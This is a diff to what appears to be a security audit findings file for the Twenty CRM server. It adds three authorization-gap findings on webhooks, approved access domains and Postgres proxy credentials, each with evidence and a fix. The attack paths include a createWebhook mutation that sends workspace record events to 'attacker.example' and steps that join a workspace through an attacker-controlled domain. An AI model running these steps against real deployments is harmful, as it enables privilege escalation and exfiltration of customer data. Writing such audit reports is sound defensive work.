@@ -32,7 +32,7 @@
       "commit_hash": "bba1b296c1df7dcf0aff62f57cb83d00178c1307",
       "detected_at_pst": "2026-11-16T19:10:27-08:00",
       "reported_link": "",
-      "attack_path": "1. Authenticate as a normal workspace member.\n2. Query currentUser { workspaceMembers { roles { id label } } } (and/or currentWorkspace { inviteHash defaultRole { id } }) to obtain the Admin role UUID.\n3. Call mutation updateWorkspace(data: { defaultRoleId: \"<admin-role-id>\" }) — no ROLES/SECURITY check runs.\n4. Optionally set inviteHash to an attacker-chosen value. Join with a second account via the public invite link (isPublicInviteLinkEnabled defaults true) and receive the Admin default role via addUserToWorkspaceIfUserNotInWorkspace.",
+      "attack_path": "1. Authenticate as a normal workspace member.\n2. Query currentUser { workspaceMembers { roles { id label } } } (and/or currentWorkspace { inviteHash defaultRole { id } }) to obtain the Admin role UUID.\n3. Call mutation updateWorkspace(data: { defaultRoleId: \"<admin-role-id>\" }) \u2014 no ROLES/SECURITY check runs.\n4. Optionally set inviteHash to an attacker-chosen value. Join with a second account via the public invite link (isPublicInviteLinkEnabled defaults true) and receive the Admin default role via addUserToWorkspaceIfUserNotInWorkspace.",
       "evidence": [
         "packages/twenty-server/src/engine/core-modules/workspace/workspace.resolver.ts:122-138",
         "packages/twenty-server/src/engine/core-modules/workspace/dtos/update-workspace-input.ts:159-192",
@@ -71,7 +71,7 @@
       "location": "packages/twenty-server/src/engine/core-modules/health/controllers/health.controller.ts",
       "title": "Unauthenticated /healthz/:indicatorId exposes database, Redis, worker, and workspace internals",
       "description": "GET /healthz is a shallow liveness check, but GET /healthz/:indicatorId is also PublicEndpointGuard-protected and returns rich diagnostics. database returns Postgres version, connection counts, database size, top tables (schemaname/relname), cache hit ratio, deadlocks, and slow query counts. redis returns INFO-derived memory/clients/stats/replication. app returns total workspace counts and up to 500 workspaceIds with pending migrations.",
-      "impact": "Unauthenticated internet clients can fingerprint the stack, observe capacity and failure modes, and enumerate workspace IDs tied to migration problems—useful reconnaissance for further attacks and operational intelligence leakage.",
+      "impact": "Unauthenticated internet clients can fingerprint the stack, observe capacity and failure modes, and enumerate workspace IDs tied to migration problems\u2014useful reconnaissance for further attacks and operational intelligence leakage.",
       "verified": true,
       "status": "active",
       "background_composer_id": "bc-059f9631-8410-5935-b0d2-2e46b1760031",
@@ -129,6 +129,72 @@
       ],
       "remediation": "Fail startup when APP_SECRET is missing or equals the placeholder. Remove plaintext default DB passwords from committed manifests; require secrets via env/Secret objects. Document mandatory rotation in deploy docs (already partially present) and enforce it in entrypoint checks.",
       "poc_video_notes": "Defaults confirmed in compose and k8s manifests; no production cluster was targeted."
+    },
+    {
+      "severity": "high",
+      "location": "packages/twenty-server/src/engine/core-modules/webhook/webhook.resolver.ts",
+      "title": "Webhook GraphQL CRUD lacks API_KEYS_AND_WEBHOOKS permission \u2014 any member can exfiltrate workspace events",
+      "description": "WebhookResolver is protected only by WorkspaceAuthGuard. SettingPermissionType.API_KEYS_AND_WEBHOOKS exists and is enforced for generateApiKeyToken and for workspace-schema apiKey/webhook objects via OBJECTS_WITH_SETTINGS_PERMISSIONS_REQUIREMENTS, but the dedicated GraphQL WebhookResolver never applies SettingsPermissionsGuard. Any authenticated workspace member can createWebhook (including attacker-controlled targetUrl and secret), list webhooks (secrets are GraphQL fields), update, or delete. CallWebhookJobsJob delivers record change events (including record payloads) to registered targetUrls.",
+      "impact": "A low-privilege member can register an outbound webhook to an attacker server and receive ongoing CRM object-record event payloads (creates/updates/deletes), enabling bulk data exfiltration and abuse of integration secrets exposed on Webhook.secret.",
+      "verified": true,
+      "status": "active",
+      "background_composer_id": "authz-deep-dive-2026-11-17",
+      "commit_hash": "bb6ee3e43417053002ae20b3529336b70ae1d63b",
+      "detected_at_pst": "2026-11-16T19:15:04-08:00",
+      "reported_link": "",
+      "attack_path": "1. Authenticate as a normal Member (canUpdateAllSettings=false).\n2. Call mutation createWebhook(input:{ targetUrl:\"https://attacker.example/hook\", operations:[\"*.*\"], secret:\"x\" }) \u2014 only WorkspaceAuthGuard runs.\n3. Wait for or trigger record changes in the workspace.\n4. CallWebhookJobsJob matches operations and POSTs event payloads (record data) to the attacker URL.",
+      "evidence": [
+        "packages/twenty-server/src/engine/core-modules/webhook/webhook.resolver.ts:16-77",
+        "packages/twenty-server/src/engine/core-modules/webhook/webhook.entity.ts:40-42",
+        "packages/twenty-server/src/modules/webhook/jobs/call-webhook-jobs.job.ts:37-90",
+        "packages/twenty-server/src/engine/api/graphql/graphql-query-runner/constants/objects-with-settings-permissions-requirements.ts:3-6",
+        "packages/twenty-server/src/engine/core-modules/auth/auth.resolver.ts:491-504"
+      ],
+      "remediation": "Apply @UseGuards(SettingsPermissionsGuard(SettingPermissionType.API_KEYS_AND_WEBHOOKS)) on WebhookResolver (class-level), matching generateApiKeyToken and the workspace-schema object permission map. Stop returning webhook secrets to callers without that permission.",
+      "poc_video_notes": "Authorization gap confirmed by comparing WebhookResolver guards to SettingsPermissionsGuard usage on generateApiKeyToken and OBJECTS_WITH_SETTINGS_PERMISSIONS_REQUIREMENTS; delivery path confirmed in CallWebhookJobsJob."
+    },
+    {
+      "severity": "high",
+      "location": "packages/twenty-server/src/engine/core-modules/approved-access-domain/approved-access-domain.resolver.ts",
+      "title": "Approved access domain management missing SECURITY permission enables unauthorized workspace join",
+      "description": "ApprovedAccessDomainResolver uses only WorkspaceAuthGuard. SSO/security settings elsewhere use SettingsPermissionsGuard(SECURITY), but any workspace member can createApprovedAccessDomain, deleteApprovedAccessDomain, and getApprovedAccessDomains. After validating a domain they control (email confirmation to that domain), AuthService.checkAccessForSignIn short-circuits and allows sign-in/sign-up into the workspace without invite for emails on that domain.",
+      "impact": "A compromised or malicious member who controls (or can receive mail for) a company domain can trust that domain on the victim workspace and onboard arbitrary accounts @that-domain without invitations, expanding the attack surface and enabling further privilege escalation when combined with defaultRoleId mass-assignment.",
+      "verified": true,
+      "status": "active",
+      "background_composer_id": "authz-deep-dive-2026-11-17",
+      "commit_hash": "bb6ee3e43417053002ae20b3529336b70ae1d63b",
+      "detected_at_pst": "2026-11-16T19:15:04-08:00",
+      "reported_link": "",
+      "attack_path": "1. As a Member, call createApprovedAccessDomain(input:{ domain:\"attacker-corp.com\", email:\"you@attacker-corp.com\" }).\n2. Complete email validation via validateApprovedAccessDomain.\n3. Call public signUpInWorkspace (or SSO sign-in) with a new email @attacker-corp.com and workspaceId \u2014 checkAccessForSignIn returns early due to approvedAccessDomains match without requiring an invite.\n4. New account joins the workspace.",
+      "evidence": [
+        "packages/twenty-server/src/engine/core-modules/approved-access-domain/approved-access-domain.resolver.ts:20-93",
+        "packages/twenty-server/src/engine/core-modules/approved-access-domain/services/approved-access-domain.service.ts:150-189",
+        "packages/twenty-server/src/engine/core-modules/auth/services/auth.service.ts:631-638",
+        "packages/twenty-server/src/engine/core-modules/sso/sso.resolver.ts:34"
+      ],
+      "remediation": "Guard ApprovedAccessDomainResolver with SettingsPermissionsGuard(SettingPermissionType.SECURITY). Keep validateApprovedAccessDomain reachable only with a valid validation token and optionally without broad membership privileges, but never allow unprivileged create/delete.",
+      "poc_video_notes": "Guard absence and checkAccessForSignIn trusted-domain bypass confirmed in source; live email validation not exercised in this environment."
+    },
+    {
+      "severity": "high",
+      "location": "packages/twenty-server/src/engine/core-modules/postgres-credentials/postgres-credentials.resolver.ts",
+      "title": "Postgres proxy credentials enable/get/disable exposed to any workspace member",
+      "description": "PostgresCredentialsResolver mutations/queries (enablePostgresProxy, disablePostgresProxy, getPostgresCredentials) are guarded only by WorkspaceAuthGuard. enablePostgresProxy generates a username/password, encrypts the password at rest, and returns the plaintext password in the GraphQL response. getPostgresCredentials decrypts and returns the plaintext password to any member.",
+      "impact": "Any authenticated member can create or read workspace Postgres-proxy credentials. Where the Postgres proxy feature is deployed/enabled, that yields direct SQL-level access to workspace data far beyond the member role\u2019s intended GraphQL object permissions.",
+      "verified": true,
+      "status": "active",
+      "background_composer_id": "authz-deep-dive-2026-11-17",
+      "commit_hash": "bb6ee3e43417053002ae20b3529336b70ae1d63b",
+      "detected_at_pst": "2026-11-16T19:15:04-08:00",
+      "reported_link": "",
+      "attack_path": "1. Authenticate as a Member.\n2. Call enablePostgresProxy (or getPostgresCredentials if already enabled).\n3. Receive plaintext user/password for the workspace postgres proxy and connect if the proxy endpoint is available for the deployment.",
+      "evidence": [
+        "packages/twenty-server/src/engine/core-modules/postgres-credentials/postgres-credentials.resolver.ts:16-34",
+        "packages/twenty-server/src/engine/core-modules/postgres-credentials/postgres-credentials.service.ts:25-66",
+        "packages/twenty-server/src/engine/core-modules/postgres-credentials/postgres-credentials.service.ts:101-126"
+      ],
+      "remediation": "Require SettingsPermissionsGuard(SettingPermissionType.SECURITY) or a dedicated admin setting permission for all postgres-credentials operations. Avoid returning plaintext passwords on get; prefer one-time display only at enable time to admins.",
+      "poc_video_notes": "Missing SettingsPermissionsGuard and plaintext password return confirmed in resolver/service. In-repo postgres proxy listener was not present; impact assumes the documented proxy feature is reachable in the deployment."
     }
   ]
 }
